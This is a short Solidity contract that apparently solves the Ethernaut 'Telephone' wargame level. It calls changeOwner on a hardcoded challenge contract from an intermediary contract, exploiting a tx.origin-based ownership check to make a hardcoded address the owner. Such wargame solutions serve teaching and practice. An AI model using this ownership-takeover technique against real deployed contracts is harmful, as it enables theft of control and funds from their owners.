// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./4_Telephone.sol";

contract Ethernaut4 {
    Telephone public phone = Telephone(0x32d0D801060d721A5a17500F7e12E54122b0bf6d);
    address myAddress = 0x9B296E577808C9a4F8B0c7C882162806861719Dc;

    function change() public {
        phone.changeOwner(myAddress);
    }

}